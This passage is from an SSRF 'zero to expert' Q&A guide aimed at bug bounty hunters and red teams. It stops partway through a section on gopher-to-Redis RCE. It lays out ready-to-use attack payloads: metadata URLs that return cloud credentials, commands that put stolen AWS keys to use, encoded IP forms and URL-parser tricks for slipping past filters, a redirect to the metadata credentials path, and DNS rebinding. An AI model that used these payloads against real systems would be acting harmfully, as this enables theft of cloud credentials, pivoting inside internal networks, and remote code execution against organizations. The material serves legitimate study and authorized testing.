# Server-Side Request Forgery (SSRF) — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for SSRF: from "what is it" to cloud-account takeover, gopher-to-RCE, blind exfiltration, and filter-bypass mastery. Q&A format, progressive difficulty, written as **"IF this → THEN that"** decision logic. Includes tools, payloads, methodology, real-world references, **and** defense + bypass.
>
> ⚖️ **Authorized use only.** For bug bounty (in-scope), sanctioned pentests, CTFs, and learning. SSRF reaches *internal* systems and *cloud credentials* — stay strictly within scope; reading cloud metadata or pivoting internally can exceed program rules. Confirm with a benign OAST callback first; don't dump production data.

> 🧭 **New to this? Read this first.** A website often has a feature where **you give it a link and its server goes and fetches that link** — "paste a URL for a preview," "import a picture from this address," "send our webhook to your URL," "save this page as a PDF." **SSRF** (Server-Side Request Forgery) is tricking that server into fetching something it was never supposed to — its *own* internal address, a database hidden behind the company firewall, or a magic cloud address that hands out the master keys. Picture the server as a **hotel concierge**: you're stuck in the lobby (the public internet), but the concierge can walk anywhere in the building (the internal network). You can't get into the manager's office — so you ask the concierge to fetch something from it *for you*. That's SSRF. It pays extremely well because one of those internal "rooms" (the cloud metadata address `169.254.169.254`, Level 2) literally stores the cloud account's credentials — that's how the Capital One breach happened. Don't worry about the jargon (metadata, gopher, IMDS, DNS rebinding); each term is explained in plain English the first time it appears, and the reading is written as **"IF you see this → THEN do that"** so you can follow the decision path even before you've memorized the vocabulary.

**Canonical references** (real, read them):
- PortSwigger Web Security Academy — *SSRF*
- OWASP — *SSRF Prevention Cheat Sheet* + WSTG "Testing for SSRF"
- Orange Tsai — *A New Era of SSRF* (Black Hat USA 2017, URL-parser confusion)
- Capital One breach (2019) — SSRF → AWS IMDS → IAM creds → S3 (the canonical real-world case)
- HackTricks — *SSRF* ; PayloadsAllTheThings — *Server Side Request Forgery*

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q10)
- **Level 1 — Finding & confirming SSRF** (Q11–Q20)
- **Level 2 — Cloud metadata exploitation (the money shot)** (Q21–Q33)
- **Level 3 — Bypassing SSRF filters (blocklist/allowlist/parser/DNS-rebinding/redirect)** (Q34–Q50)
- **Level 4 — Protocol smuggling: gopher / dict / file / internal services → RCE** (Q51–Q62)
- **Level 5 — Vectors: webhooks, PDF/HTML, XXE, image/file processing, headers, GraphQL** (Q63–Q74)
- **Level 6 — Expert / red-team chains, blind exploitation, port scanning** (Q75–Q86)
- **Tooling** (Q87–Q90)
- **Black-box methodology & decision tree** (Q91–Q95)
- **Payload cheat sheets** (Q96–Q99)
- **Real-world case patterns & references** (Q100–Q102)
- **Defense — how to stop SSRF properly** (Q103–Q106)
- **Appendix — 60-second field checklist**

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is SSRF in one sentence?
SSRF tricks a **server-side application into making a network request to a destination the attacker chooses** — turning the server into a **confused deputy** that uses *its* network position (internal network, localhost, cloud metadata) on the attacker's behalf.

*Plain version:* you make the server fetch a URL *you* pick, so its request goes out with *its* address and *its* permissions to somewhere *you* could never reach directly. "**Confused deputy**" is the classic term: the server is a trusted insider (a deputy) that you fool into abusing its trust on your behalf — like tricking a security guard into unlocking a door for you because you handed him a convincing note.

### Q2. Why is SSRF so dangerous?
Because the server can reach things you can't: **cloud metadata endpoints** (steal IAM credentials → full cloud account takeover), **internal-only services** (admin panels, Redis, Elasticsearch, Kubernetes/Docker APIs, Spring actuator), **localhost** services, and the **internal network** (port scan, pivot). The most famous breach (Capital One, 2019) was SSRF → AWS metadata → IAM creds → 100M records. SSRF routinely escalates to **RCE** and **cloud compromise**.

*Why in plain terms:* the server lives *inside* the trusted zone where a lot of internal systems have **no password at all** — because their owners assumed "only our own machines can reach these." SSRF turns you into one of "our own machines," so all those unlocked internal doors are suddenly reachable. Two of them are jackpots: the **cloud credential vault** (Q8) and any internal service you can push commands to (which leads to running your own code, "RCE" — Level 4).

### Q3. What are the three flavors of SSRF?
- **Full / in-band**: the fetched response is **returned to you** (you read internal content directly). Best case.
- **Semi-blind**: you get *partial* signal — status codes, response length, timing, error messages — enough to infer.
- **Blind**: no response at all; you confirm only via **out-of-band (OAST)** callbacks (DNS/HTTP to your server) and exploit by **side effects** or **exfil tricks**.

*In plain words:* this is just "**how much do you get to see** of what the server fetched," and it dictates your whole approach. **Full** = the app shows you the internal content it grabbed (you can read it — easiest). **Semi-blind** = you don't see the content, but something measurable changes (a different error, a slower response) that acts as a yes/no signal. **Blind** = you see nothing in the app; your only proof is that a server *you* run got pinged (an "**OAST**" callback — explained in Q12). Blind still leads to Critical; you just escalate differently.

### Q4. What's the root condition for SSRF? (IF→THEN)
**IF** the application takes a **URL/host/path (directly or indirectly) influenced by the user** and **makes a server-side request to it**, **AND** doesn't strictly validate the *resolved destination*, **THEN** SSRF is possible. The user input can be obvious (`?url=`) or hidden (a webhook, an XML entity, an image to rasterize, a Host header used for routing).

*The takeaway:* two ingredients are needed — (1) **you can influence a URL/host** the server will fetch (obvious like `?url=`, or hidden like a webhook or an uploaded XML file), and (2) the server **doesn't properly check where that URL actually points** before connecting. Missing either ingredient means no SSRF. So your hunt is: find the fetch, then test whether you can aim it somewhere forbidden.

### Q5. Where does SSRF typically live (injection points)?
- **URL parameters**: `url, uri, path, dest, redirect, return, next, fetch, site, page, feed, host, port, to, out, view, dir, show, image, img, source, src, callback, link, data, domain, proxy, continue, window`.
- **Webhooks / callback URLs** (you supply a URL the server calls).
- **"Import/fetch from URL"** (avatar-by-URL, document import, RSS/feed reader, link unfurl/preview, oEmbed, OpenGraph).
- **PDF/HTML renderers** (wkhtmltopdf, headless Chrome, "export to PDF").
- **Document/XML parsers** (XXE → SSRF), **image/file processing** (ImageMagick SVG, ffmpeg).
- **Headers**: `Host` (routing SSRF), `Referer`, `X-Forwarded-For`/`Forwarded` (sometimes), `X-Forwarded-Host`.
- **SSO/SAML metadata URLs**, **CI/CD**, **GraphQL**, **stock/health-check/"is this site up?"** features.

### Q6. SSRF vs CSRF — don't confuse them.
- **CSRF**: the *victim's browser* (client) is forced to send a request (client-side, rides the user's cookies, can't read response).
- **SSRF**: the *server* is forced to send a request (server-side, rides the server's network/credentials, may read response). Totally different — SSRF is far more powerful (reaches internal infra and cloud creds).

*The one-word difference: **who** sends the request.* CSRF weaponizes the *victim's browser* (limited — it can only do what the victim's cookies allow and can't read the reply). SSRF weaponizes the *server* (far scarier — it rides the server's network position and cloud identity, and often hands you the response). The names look similar; the power gap is enormous.

### Q7. What makes SSRF reach things the attacker can't?
The server sits **inside** the trust boundary: it can hit `127.0.0.1`, `169.254.169.254` (cloud metadata), RFC1918 ranges (`10.x`, `192.168.x`, `172.16–31.x`), `.internal`/`.local`/`.svc.cluster.local` names, and link-local. Internal services often have **no auth** because "only internal traffic reaches them" — SSRF breaks that assumption.

*In plain words:* those number ranges (`127.0.0.1` = the server talking to itself; `10.x`/`192.168.x`/`172.16–31.x` = the private internal network, called **RFC1918**; `169.254.x` = "link-local," including the metadata vault) are addresses that **only exist inside** and are unreachable from your home internet. The server can touch all of them, and — crucially — the services living there frequently have **no login** because their owners trusted the network wall. SSRF is you reaching over that wall using the server's arm.

### Q8. What is the cloud metadata endpoint and why is it the crown jewel?
A link-local IP every cloud VM can query for instance config — **including temporary credentials** for the attached IAM role. AWS/GCP/Azure/etc. all expose one (mostly `169.254.169.254`). Stealing those credentials via SSRF = act as the server in the cloud account → read S3, DBs, escalate → **account takeover**.

*In plain words:* a cloud server needs to know "who am I and what am I allowed to do?" without a password hardcoded in its files. The cloud answers that at a special internal-only address — **`169.254.169.254`**, the **metadata service** (AWS calls it **IMDS**) — which, if you ask the right path, returns **live temporary keys** carrying the server's permissions. SSRF lets you make the server ask *for its own keys* and hand them to you. Now you *are* the server in the cloud account. That's the shortest path from a web bug to owning an entire cloud environment, and it's the first thing to try.

### Q9. Can SSRF do more than HTTP?
Yes — if the URL fetcher supports other **schemes**: `file://` (read local files), `gopher://` (craft arbitrary TCP bytes → talk to Redis/SMTP/FastCGI → RCE), `dict://`, `ftp://`, `ldap://`, `tftp://`, `sftp://`, `php://`, `netdoc://` (Java). Scheme support is the difference between "read an internal web page" and "RCE on internal Redis."

*Why schemes matter (the "scheme" is the bit before `://`):* `http` just fetches web pages, but a fetcher that also allows **`file://`** reads files off the server's own disk (secrets!), and **`gopher://`** lets you send *raw bytes* to any internal service — which is how SSRF becomes "run my code on their box" (Level 4). So one of your first tests on any sink is *which schemes does it accept?* — it can turn a mild bug into a Critical.

### Q10. The attacker mindset for SSRF?
For any feature that fetches a URL: *"Can I point it at `169.254.169.254`, `localhost`, an internal host, or `file://`? If filtered, can I encode/redirect/rebind/parser-trick my way past the check? Can I switch protocols to reach a non-HTTP internal service? Can I read the response or only confirm blind?"* Then chain to **cloud creds / internal RCE**.

*The reflex in one line:* every time a feature fetches a link, ask **"can I steer it inward, and if something blocks me, can I disguise the address or change the protocol to get past?"** Then always push toward the two big payoffs — **cloud credentials** or **internal code execution** — because the fetch itself is only worth as much as the deepest place you can steer it.

---

# LEVEL 1 — FINDING & CONFIRMING SSRF

### Q11. How do I find SSRF candidates (recon)?
Proxy the app and flag any request where a **parameter or header looks like a URL/host/path**, or any feature that **fetches remote content**: webhooks, link previews, avatar-by-URL, PDF export, document import, RSS, "test connection", SAML metadata. Also decompile mobile apps for hidden fetch endpoints. Use param-discovery (Arjun/ffuf, `param-miner`) to find hidden `url`-like params.

### Q12. How do I confirm SSRF with an OAST/collaborator?
Point the param at a unique **Burp Collaborator / interactsh** host: `?url=http://abc123.oast.fun/`. Then watch:
- **DNS + HTTP hit** → the server resolved **and fetched** it → SSRF confirmed (at least blind).
- **DNS only** → something resolved your name (maybe a scanner/AV/parser) but didn't fetch — weaker signal, keep probing.
- **No hit** → maybe blocked, async, or not SSRF.

*In plain words — what "OAST" is and why you need it:* **OAST** (Out-of-band Application Security Testing) just means **a server that you control which logs everyone who connects to it.** Burp Collaborator and interactsh give you a unique throwaway domain (like `abc123.oast.fun`) for free. You feed *that* domain to the app's fetch feature; if the app's server actually fetches it, your OAST log lights up with the hit — and it even shows you the **source IP** of whoever connected. That's your proof: if the connection came from a *server/cloud* IP (not your own home IP), the server made the request = SSRF confirmed. Since most real SSRF is **blind** (the app shows you nothing), this callback is often your *only* evidence — so set it up before anything else. A **DNS-only** hit (your domain was looked up but not fetched) is a weaker "something noticed it" signal; a full **DNS + HTTP** hit is the real confirmation.

### Q13. IF the response is reflected back to me → ?
Full/in-band SSRF. Point at `http://127.0.0.1/`, internal hosts, `http://169.254.169.254/...`, or `file:///etc/passwd` and read the content directly. Highest impact, easiest to demonstrate.

### Q14. IF I get a callback but no reflected content → ?
Blind/semi-blind SSRF. Confirm via OAST, then exploit via: cloud metadata exfil (if you can route the data out), internal side-effect endpoints, port-scan by timing/errors, or chaining (Level 6). Still often **High/Critical** if you can reach metadata.

### Q15. How do I tell "full" from "blind" quickly?
Send `?url=http://OAST/` (confirms fetch) and `?url=http://127.0.0.1:80/` (or a known internal page). **IF** the app shows you the fetched body/title/length/error → full or semi-blind. **IF** nothing comes back but OAST pinged → blind.

### Q16. First targets once SSRF is confirmed?
1. `http://169.254.169.254/...` (cloud metadata — Level 2).
2. `http://127.0.0.1/` and common local ports (`:80,:443,:8080,:8000,:8888,:9200,:6379,:5000,:9000,:2375`).
3. Internal hostnames / RFC1918 (`http://10.0.0.1/`, `http://192.168.0.1/`, `http://internal-admin/`).
4. `file:///etc/passwd`, `file:///proc/self/environ`, `file:///etc/hostname`.
5. Cloud-internal names (`http://metadata.google.internal/`, k8s `http://kubernetes.default.svc/`).

### Q17. How do I detect the server's outbound behavior (does it follow redirects? which schemes?)?
- Redirects: point at an OAST URL that returns `302 Location: http://169.254.169.254/...` and see if the second hop fires. (Critical for filter bypass — Q44.)
- Schemes: try `file://`, `gopher://`, `dict://`, `ftp://` against your OAST/known target and observe behavior/errors. Library choice (curl, Java URL, Python requests, libcurl, Go http) dictates supported schemes.

### Q18. What does the error/response timing tell me (semi-blind)?
- **Connection refused / fast error** → port closed / nothing listening.
- **Hang/timeout** → filtered or open-but-no-response.
- **Different status/length for `:80` vs `:81`** → you can **port-scan** internal hosts by diffing responses/timing (Q83).
- **Verbose error leaking the fetched content/headers** → semi-blind data exfil.

### Q19. IF only certain schemes/hosts work → ?
Map exactly what's allowed: which schemes resolve, whether `localhost`/private IPs are blocked, whether only a specific domain is permitted (allowlist). That tells you which Level-3 bypass to use.

### Q20. Beginner "IF→THEN" map.
- IF `?url=` reflects content → **full SSRF** → read internal/metadata.
- IF OAST pings but no content → **blind SSRF** → metadata exfil / side effects.
- IF localhost/private blocked → **filter bypass** (Level 3).
- IF only HTTP GET → try **redirect to other scheme / gopher** (Level 4).
- IF a webhook/PDF/XXE/image feature → that's an SSRF vector too (Level 5).

---

# LEVEL 2 — CLOUD METADATA EXPLOITATION (THE MONEY SHOT)

### Q21. AWS — what's the metadata layout (IMDSv1)?
`http://169.254.169.254/latest/meta-data/` — key paths:
```
/latest/meta-data/iam/security-credentials/                 -> <role-name>
/latest/meta-data/iam/security-credentials/<role-name>      -> AccessKeyId, SecretAccessKey, Token (TEMP CREDS)
/latest/meta-data/                                           -> instance info
/latest/user-data                                           -> bootstrap script (often has secrets!)
/latest/dynamic/instance-identity/document                  -> account id, region
```
**IF** IMDSv1 is enabled and SSRF can GET → **THEN** you grab temporary IAM creds and use them with the AWS CLI → cloud takeover (subject to the role's permissions). *This is the Capital One pattern.*

**Container & serverless creds (when EC2 IMDS is dead / IMDSv2-only — the most-missed Critical):** on ECS/Fargate/Lambda/EKS the creds aren't at `169.254.169.254`:
```
ECS / Fargate task role:  http://169.254.170.2/v2/credentials/            -> lists the GUID
                          http://169.254.170.2/v2/credentials/<GUID>      -> AccessKeyId/SecretAccessKey/Token  ⭐
                          (newer: AWS_CONTAINER_CREDENTIALS_FULL_URI on a 169.254.170.x host)
Lambda:                   creds are in the ENV -> file:///proc/self/environ  (AWS_ACCESS_KEY_ID/_SECRET/_SESSION_TOKEN)
EKS / IRSA:               file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token  (web-identity -> assume the pod role)
```
**IF** `169.254.169.254` returns nothing (or only IMDSv2 you can't header) → **THEN** try **`169.254.170.2/v2/credentials/`** (ECS), `/proc/self/environ` via `file://` (Lambda), or the IRSA token (EKS). Always try the container path when the EC2 IP is dead.

### Q22. How do I use the stolen AWS creds?
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...        # required for IMDS temp creds
aws sts get-caller-identity         # confirm who you are (do ONLY this in bounty unless authorized)
```
For a bounty PoC, `sts get-caller-identity` (proves valid creds + role) is usually sufficient impact — **don't** enumerate/exfil production data beyond proof.

### Q23. AWS IMDSv2 is enabled — now what?
IMDSv2 requires a **session token** obtained via a `PUT` with a header, then sent on each GET:
```
PUT /latest/api/token            Header: X-aws-ec2-metadata-token-ttl-seconds: 21600   -> returns TOKEN
GET /latest/meta-data/...        Header: X-aws-ec2-metadata-token: TOKEN
```
**IF** your SSRF can only do simple GETs (no custom headers, no PUT) → IMDSv2 **blocks** you. **Bypass IF**:
- SSRF can set the method to **PUT** and add the **header** (some `url=` fetchers let you, or via gopher — Q57), or
- there's a **proxy/Host-header** SSRF that forwards your headers, or
- the metadata **hop limit** is misconfigured high and you chain through a redirect that preserves method/headers.
IMDSv2 was AWS's direct response to SSRF metadata theft; assume modern targets use it and look for the header/method primitive.

### Q24. GCP metadata — and the header trick?
`http://metadata.google.internal/computeMetadata/v1/` (also `169.254.169.254`). It **requires** header `Metadata-Flavor: Google`. Key path:
```
/computeMetadata/v1/instance/service-accounts/default/token   -> OAuth access token
/computeMetadata/v1/instance/attributes/                      -> startup scripts/secrets
```
**Header-less SSRF bypass**: the legacy endpoint `?recursive=true` with `X-Google-Metadata-Request: True`, OR historically `/computeMetadata/v1beta1/...` which **didn't require** the `Metadata-Flavor` header. **IF** your SSRF can't add headers → try the v1beta1 path or a header-injecting vector (gopher/CRLF).

### Q25. Azure metadata?
`http://169.254.169.254/metadata/instance?api-version=2021-02-01` — requires header `Metadata: true`. Managed-identity token:
```
/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Header-less SSRF needs a header-injection primitive (gopher/CRLF) to add `Metadata: true`.

### Q26. Other clouds' metadata?
- **DigitalOcean**: `http://169.254.169.254/metadata/v1/` (no header) → `user-data`, region, tokens in some setups.
- **Alibaba Cloud**: `http://100.100.100.100/latest/meta-data/`.
- **Oracle Cloud (OCI)**: `http://169.254.169.254/opc/v1/instance/` and `/opc/v1/identity/`.
- **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`.
- **Kubernetes**: service-account token at `file:///var/run/secrets/kubernetes.io/serviceaccount/token`; internal API `https://kubernetes.default.svc/`; **kubelet** `:10250`.

### Q27. IF `169.254.169.254` itself is blocklisted → ?
Encode/alias it (these all resolve to the same address):
```
http://[::ffff:169.254.169.254]/         (IPv6-mapped)
http://0xA9.0xFE.0xA9.0xFE/               (hex octets)
http://0251.0376.0251.0376/               (octal)
http://2852039166/                        (decimal of 169.254.169.254)
http://169.254.169.254.nip.io/            (wildcard DNS -> the IP)
http://1ynrnhl.oast.fun  -> 302 redirect -> http://169.254.169.254/...   (redirect bypass)
```
Plus DNS rebinding (Q47) and parser-confusion (Q41). See Q34–Q50 for the full bypass arsenal.

### Q28. user-data / startup scripts — why grab them?
`/latest/user-data` (AWS), GCP `attributes/startup-script`, Azure customData often contain **hardcoded secrets**, deploy keys, DB creds, and bootstrap logic. Frequently higher-value than the IAM token alone.

### Q29. IF I get GCP/Azure tokens, how do I use them (proof)?
- **GCP**: the access token works as `Authorization: Bearer <token>` against `https://www.googleapis.com/...`; `gcloud auth ... ` or `curl` `tokeninfo` to prove validity.
- **Azure**: the managed-identity token authenticates to `https://management.azure.com/`; list resources to prove (scope-permitting). For bounty, prove validity minimally.

### Q30. Kubernetes / container metadata via SSRF?
**IF** the SSRF runs in a pod → `file:///var/run/secrets/kubernetes.io/serviceaccount/token` (+ `ca.crt`, `namespace`) gives a service-account JWT → hit `https://kubernetes.default.svc/api/...` (RBAC-permitting) → enumerate/escalate. Also target **kubelet** (`:10250/pods`, `/run`), **etcd** (`:2379`), and the **Docker socket** (`/var/run/docker.sock` via `unix://` or gopher) → container escape/RCE.

### Q31. Spring Boot Actuator via SSRF (very common internal target)?
If an internal service is a Spring Boot app with exposed actuators:
```
/actuator/env        -> config + secrets (sometimes masked, sometimes not)
/actuator/heapdump   -> heap dump -> grep for creds/tokens
/actuator/gateway/routes (+ refresh)  -> SSRF/RCE pivots
/actuator/mappings, /actuator/configprops
```
SSRF to `http://127.0.0.1:8080/actuator/heapdump` → download → mine secrets. High-value.

### Q32. What internal HTTP services are juiciest via SSRF?
Elasticsearch (`:9200/_search`, `/_cat/indices`), Kibana, MongoDB/Couch HTTP, Jenkins (`:8080`, `/script` → Groovy RCE), Jira/Confluence, Consul (`:8500`), Nomad, Vault (`:8200`), internal admin panels, Prometheus, internal CI, Spring actuator, Solr (`:8983`), Grafana. Many have **no auth internally**.

### Q33. Cloud metadata "IF→THEN" summary.
- IMDSv1 + GET SSRF → grab IAM creds → cloud takeover.
- IMDSv2 → need PUT+header primitive (gopher/CRLF/proxy) or give up on AWS metadata.
- GCP → need `Metadata-Flavor` header → use v1beta1 / header-injection if header-less.
- Azure → need `Metadata: true` header → header-injection vector.
- IP blocked → encode (hex/oct/dec/IPv6/nip.io) / redirect / rebind.
- In a pod → read SA token file + hit k8s API; Docker socket → RCE.

---

# LEVEL 3 — BYPASSING SSRF FILTERS

### Q34. The app blocks `localhost`/`127.0.0.1`. What are all the alternates?
```
127.0.0.1  ->  127.1   127.0.1   0.0.0.0   0   0x7f000001   2130706433
              0177.0.0.1   127.000.000.001   127.0.0.1.nip.io   localtest.me
IPv6       ->  [::1]   [::]   [0:0:0:0:0:ffff:127.0.0.1]   [::ffff:7f00:1]
names      ->  localhost   localhost.localdomain   *.nip.io / *.sslip.io
```
**IF** the blocklist is a string match on "127.0.0.1"/"localhost" → any of the above evades it while still hitting loopback.

### Q35. IP-encoding tricks in detail (why they work)?
A single IPv4 address has many textual forms the OS resolver accepts but naive validators don't:
- **Decimal**: `2130706433` = 127.0.0.1; `2852039166` = 169.254.169.254.
- **Octal**: `0177.0.0.1`, `0251.0376.0251.0376`.
- **Hex**: `0x7f000001`, `0xA9FEA9FE`.
- **Mixed / fewer octets**: `127.1`, `0x7f.1`, `127.0.0x1`.
- **Overflow/dotless**, leading zeros, etc.
**IF** the validator parses the string differently from `inet_aton`/the HTTP client → bypass. (Classic parser-differential class.)

*In plain words:* an IP address is really just a number wearing a familiar four-part costume. `127.0.0.1` can be written as one big decimal (`2130706433`), in hex (`0x7f000001`), in octal, or shortened (`127.1`) — and the operating system happily unwraps *all* of them back to the same address. The exploit lives in a **disagreement**: the app's filter reads the weird form as text and thinks "that's not a blocked IP, looks fine," but the OS's connect function (`inet_aton`) decodes it to `127.0.0.1` and connects anyway. So when `127.0.0.1` is blocked, you just hand over a differently-costumed version of the same address. (`2130706433` = the bytes `127·0·0·1` packed into one 32-bit number: `127×256³+0+0+1`.)

### Q36. IPv6 bypasses?
`[::1]` (loopback), `[::]` (all/loopback on some stacks), **IPv4-mapped** `[::ffff:127.0.0.1]` / `[::ffff:7f00:1]`, and `[::ffff:169.254.169.254]` for metadata. Validators that only blocklist IPv4 forms miss these.

### Q37. The app uses an **allowlist** (only `example.com` allowed). How to bypass?
Make the URL *look* allowed to the validator but *resolve/connect* elsewhere:
- **Userinfo trick**: `http://expected.com@evil.com/` (host is `evil.com`; validator may read `expected.com`).
- **Subdomain you control**: `http://evil.com/?x=expected.com`, `http://evil.com#expected.com`, `http://evil.com\expected.com`.
- **Prefix/suffix confusion**: `http://expected.com.evil.com/`, `http://evilexpected.com/`.
- **Open redirect on the allowed host** (Q45): point at `https://expected.com/redirect?to=http://169.254.169.254/` → the server fetches the allowed host, which 302s internally.
- **DNS rebinding** (Q47): a name that passes the allowlist then resolves internal.
- **Parser confusion** (Q41): backslashes, `@`, fragments, whitespace, unicode.

### Q38. The `@` (userinfo) bypass — explain precisely.
In `http://A@B/`, `A` is userinfo and `B` is the **real host**. A validator that takes "everything before the first `/` after `//`" or splits on `.` wrong may think the host is `A` (the allowed value) while the HTTP client connects to `B`. Variants: `http://allowed.com@169.254.169.254/`, `http://169.254.169.254%2F@allowed.com/` (and vice-versa). Orange Tsai's research catalogs many such parser disagreements.

### Q39. Fragment (`#`) and query (`?`) tricks?
`http://169.254.169.254#@allowed.com/` or `http://allowed.com#.evil.com` — the fragment isn't sent to the server but may confuse a validator that scans the whole string. `http://169.254.169.254/?allowed.com` puts the allowed string in the query while the host stays internal.

### Q40. Backslash and whitespace tricks?
Browsers and some libs treat `\` like `/`. `http://allowed.com\@169.254.169.254/` or `http://169.254.169.254\.allowed.com/`. Also `\t`, `\r`, `\n`, `%09`, `%0d%0a`, and `%00` can split/confuse parsers (e.g., `http://127.0.0.1%00.allowed.com`). CRLF can become header injection (Q60).

### Q41. What is "URL parser confusion" (the core advanced idea)?
The component that **validates** the URL (e.g., a regex, `urllib.parse`, a custom splitter) and the component that **makes the request** (curl, Java `URL`, Go `net/http`, browser) **disagree** about which part is the host. The attacker crafts a URL where validator-host = allowed but client-host = internal. Examples (from Orange Tsai BH2017):

*In plain words — this is the master idea behind half the bypasses:* a URL is fed through **two** different pieces of code — one that **checks** "is this allowed?" and one that **actually connects**. If those two disagree about *which part of the string is the real destination*, you win. Classic example: `http://allowed.com@169.254.169.254/`. The checker sees `allowed.com` and approves it — but everything before the `@` in a URL is just a *username*, so the connector connects to `169.254.169.254`. Same string, two readings, and you live in the gap. Orange Tsai's Black Hat 2017 research is a whole catalog of these disagreements (backslashes, extra `@`s, weird ports, Unicode digits). Your job: find one string the *checker* reads as safe and the *connector* reads as internal.
```
http://127.0.0.1\tgoogle.com           http://google.com#\@127.0.0.1
http://foo@127.0.0.1:80@google.com      http://127.0.0.1:11211:80/
http://0://evil.com:80;http://google.com:80/
http://①②⑦.⓪.⓪.①                       (unicode digits normalized to 127.0.0.1)
```
Find the differential, weaponize it.

### Q42. Unicode / IDN normalization bypass?
Some parsers **normalize** unicode late: full-width/circled digits (`①②⑦.⓪.⓪.①`), unicode dots (`。` U+3002), or IDN punycode can pass an ASCII blocklist then normalize to a blocked host at resolution. Test unicode look-alikes for `127.0.0.1`/`169.254.169.254`.

### Q43. The app resolves the hostname and checks the IP is public. How to bypass?
- **DNS rebinding** (Q47): pass the check with a public IP, then serve an internal IP at fetch time (TOCTOU).
- **Redirect** (Q44): the validated public URL responds `302` to an internal URL.
- **A record pointing internal**: a domain you control whose A record is `127.0.0.1` / `169.254.169.254` (e.g., `127.0.0.1.nip.io`, or your own zone). **IF** validation only blocks *literal* IPs but resolves *names* without re-checking the resolved IP → your name → internal IP wins.

### Q44. Redirect-based bypass — when and how?
**IF** the server **follows redirects** and only validates the **initial** URL → host an attacker URL that returns:
```
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
The server validates `http://attacker.com/` (allowed/public), fetches it, then **follows** to the internal/metadata target. Use a 30x with `Location:` to any blocked destination, **including scheme switches** (`Location: gopher://...`, `file://...`, `dict://...`) if the client follows cross-scheme redirects. Extremely effective against allowlists+blocklists that check only the first URL.

### Q45. Open-redirect-on-allowed-host bypass?
**IF** the only allowed host has an **open redirect** (`https://allowed.com/out?url=...`) → set the SSRF to that allowed URL with the redirect pointed internal. The server fetches the *allowed* host, which redirects it to `169.254.169.254`/internal. Allowlist satisfied, internal reached. Always look for open redirects on the allowlisted domain.

### Q46. IF the server validates AND re-validates after redirect → ?
Stronger. Then you need: DNS rebinding (TOCTOU on the *connection*), a parser-differential that survives re-validation, or a different vector (gopher/file/XXE). Note many "re-validate" implementations still validate the *hostname* not the *connected IP* → rebinding wins.

### Q47. Explain DNS rebinding for SSRF.
A TOCTOU between **validation DNS lookup** and **request DNS lookup**:
1. Validator resolves `evil-rebind.com` → returns a **public** IP → passes the "is it public?" check.
2. Milliseconds later the HTTP client resolves `evil-rebind.com` again → your DNS now returns **`169.254.169.254`/`127.0.0.1`** → the request hits internal.
You control the authoritative DNS with a tiny TTL (0) and flip the answer (or round-robin both IPs). Tools: **rbndr** (`make-rebind`), **Singularity of Origin**, your own DNS server. Works when there are *two separate* DNS resolutions and no IP pinning.

*In plain words — it's a bait-and-switch on the address book.* Some apps defend themselves by first **looking up** your domain and checking "does it point to a safe public address?" — and only fetching if yes. Rebinding beats that by making *your* domain answer the two look-ups **differently**. You run your domain's DNS with a near-zero expiry (**TTL**) so the answer is allowed to change instantly: the **check** look-up gets a harmless public IP (approved ✅), and a heartbeat later the **fetch** look-up gets `169.254.169.254` (connects internal ❌). Same name, two answers, milliseconds apart. "**TOCTOU**" (Time-Of-Check to Time-Of-Use) is the general name for any bug where a value is safe when checked but changed by the time it's used. It only works when the app does *two separate* DNS look-ups and doesn't "pin" (lock onto) the first IP.

### Q48. IF only one DNS resolution happens (pinned)? 
Rebinding needs two lookups. **IF** the app resolves once and connects to that exact IP → rebinding fails; pivot to redirect, parser-confusion, or another vector. **IF** it resolves for validation but the HTTP library re-resolves on connect → rebinding works.

### Q49. The app strips/blocks the scheme (only `http(s)://`). Bypass?
- Use the **redirect** to switch scheme post-validation (Q44) if the client follows cross-scheme redirects.
- Or find a vector with a more permissive fetcher (XXE supports `file`/`http`/`ftp`/`jar`/`netdoc`; ImageMagick supports `url:`/`mvg`; some libs allow `gopher`).
- Case/whitespace on the scheme: `HTTP://`, ` http://`, `http:/\/`.

### Q50. Filter-bypass "IF→THEN" master list.
- Blocks "localhost"/"127.0.0.1" → `127.1`/`0`/decimal/hex/octal/`[::1]`/`nip.io`.
- Blocks `169.254.169.254` → encode it / `[::ffff:a9fe:a9fe]` / redirect / rebind.
- Allowlist host → `@`/`#`/`\`/subdomain/prefix tricks / open-redirect-on-allowed / rebind.
- Checks resolved IP once → DNS rebinding / redirect.
- Re-checks after redirect → rebinding (IP) / parser confusion / other vector.
- Scheme-restricted → redirect scheme-switch / XXE / ImageMagick / gopher via redirect.
- Regex blocklist → unicode/IDN/parser-differential.

---

# LEVEL 4 — PROTOCOL SMUGGLING & INTERNAL-SERVICE RCE

### Q51. Why is `gopher://` the SSRF superweapon?
`gopher://host:port/_<urlencoded-bytes>` lets the server send **arbitrary raw TCP bytes** to any host:port. That means you can speak **any** text protocol: craft a full **HTTP POST** (escaping GET-only SSRF), drive **Redis**, **Memcached**, **SMTP**, **MySQL**, **FastCGI/PHP-FPM**, **Zabbix**, etc. → frequently **RCE**. The payload after `/_` is the literal bytes (URL-encoded, `%0d%0a` for CRLF).

*In plain words:* normal SSRF only lets you make the server do a plain HTTP **GET** — like being able to say only one polite sentence to any internal service. `gopher://` removes that limit: it lets you send **any raw bytes you want** to any port. Since internal services (databases, caches, mail, PHP-FPM) each speak their own plain-text "language" over a TCP port, being able to send arbitrary bytes means you can **speak their language directly** and issue real commands — write files, run queries, send mail. That's why gopher is *the* path from "the server fetched a URL" to **RCE (running your code on their machine)**. You don't hand-craft the bytes; the **Gopherus** tool builds the exact `gopher://…` string for each service.

### Q52. Gopher → Redis → RCE (the classic). How?
If an internal Redis (`:6379`) is reachable and unauthenticated, send Redis commands via gopher to write a malicious file:
- **Cron job**: `SET` a key to a cron line, `CONFIG SET dir /var/spool/cron/`, `CONFIG SET dbfilename root`, `SAVE` → cron runs your command.
- **SSH key**: write `authorized_keys` to `/root/.ssh/`.
- **Module load** / RDB tricks on newer Redis.
